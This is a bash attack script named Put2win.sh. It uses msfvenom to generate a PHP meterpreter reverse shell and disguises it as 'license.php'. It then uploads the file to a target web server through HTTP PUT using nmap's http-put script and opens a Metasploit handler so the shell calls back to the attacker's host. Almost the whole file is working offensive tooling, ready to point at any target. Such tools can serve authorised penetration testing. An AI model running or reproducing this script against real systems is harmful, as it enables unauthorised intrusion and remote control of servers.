#!/bin/bash        
#title           :Put2win.sh
#description     :This script automatize shell upload by PUT HTTP method to get meterpreter.
#author		 	 :@devploit (https://github.com/sysdevploit/)
#version         :0.1    
#usage		 	 :./Put2win.sh -t TARGET [-p PORT] -u URL_PATH -l LHOST
#notes           :Install Nmap and Metasploit to use this script correctly.
#====================================================================================================

# Initial arguments
rhost=0
rport=80
path=/
lhost=0

# Usage
display_usage() { 
	echo "This script automatize shell upload by PUT HTTP method to get meterpreter." 
	echo -e "\nUsage:\n ./Put2win.sh -t TARGET [-p PORT] -u URL_PATH -l LHOST" 
	echo -e "\nExamples:\n - ./Put2win.sh -t 192.168.1.80 -u /uploads -l 192.168.1.10"
	echo -e " - ./Put2win.sh -t 192.168.1.80 -p 443 -u /uploads -l 192.168.1.10"
	} 

# Arguments
while getopts 't:p:u:l:h' arg;
do
    case $arg in
        t) rhost=$OPTARG ;;
        p) rport=$OPTARG ;;
		u) path=$OPTARG ;;
		l) lhost=$OPTARG ;;
		h) display_usage ;;
	esac
done

# Colors
RED="\033[1;31m"
GREEN="\033[1;32m"
BLUE="\033[1;34m"
NOCOLOR="\033[0m"

# Requirements installed
for p in nmap msfvenom; do
	if hash "$p" &>/dev/null
	then
		break
	else
		echo "$p is not installed"
    	exit 1
    fi
done 

# Usage
display_usage() { 
	echo "This script automatize shell upload by PUT HTTP method to get meterpreter." 
	echo -e "\nUsage:\n ./Put2win.sh -t TARGET [-p PORT] -u URL_PATH -l LHOST" 
	echo -e "\nExamples:\n - ./Put2win.sh -t 192.168.1.80 -u /uploads -l 192.168.1.10"
	echo -e " - ./Put2win.sh -t 192.168.1.80 -p 443 -u /uploads -l 192.168.1.10"
	} 

# If arguments are less than three: display usage and exit
if [ $# -le 3 ] 
then 
	exit 1
fi 

# Banner
echo -e "${RED}_____       _   ___           _       "
echo "|  __ \     | | |__ \         (_) 	 "    
echo "| |__) |   _| |_   ) |_      ___ _ __  "
echo "|  ___/ | | | __| / /\ \ /\ / / | '_ \ "
echo "| |   | |_| | |_ / /_ \ V  V /| | | | |"
echo "|_|    \__,_|\__|____| \_/\_/ |_|_| |_|"
echo -e "				@devploit${NOCOLOR}"
                                                                         
# Main
if [ -e license.php ]
then
	rm -r license.php
fi

echo -e "${BLUE}[+] Creating reverse shell...${NOCOLOR}"
msfvenom -p php/meterpreter/reverse_tcp lhost=$lhost lport=4443 -f raw -o shell.php
cat shell.php | sed 's/^..//' > license.php
rm -r shell.php
echo -e "${GREEN}[+] Reverse shell 'license.php' created!${NOCOLOR}"

echo -e "${BLUE}[+] Uploading shell to $rhost:$rport...${NOCOLOR}"
nmap=$(nmap -Pn -p $rport --script http-put --script-args http-put.url=$path'/license.php',http-put.file='license.php' $rhost | grep successfully)
if [ -z "$nmap" ]
then
	echo -e "${RED}[-] Shell has not been uploaded${NOCOLOR}"
	exit 1
fi

echo -e "${GREEN}[+] Shell succesfully uploaded to http://$rhost:$rport$path/license.php !${NOCOLOR}"

if [ -e meterpreter.rc ]
then
	rm -r meterpreter.rc
fi

echo -e "${BLUE}[+] Opening a listener in Metasploit... ${NOCOLOR}"
echo use exploit/multi/handler >> meterpreter.rc
echo set PAYLOAD php/meterpreter/reverse_tcp >> meterpreter.rc
echo set LPORT 4443 >> meterpreter.rc
echo set LHOST $lhost >> meterpreter.rc
echo set ExitOnSession false >> meterpreter.rc
echo exploit -j -z >> meterpreter.rc
msfconsole -r meterpreter.rc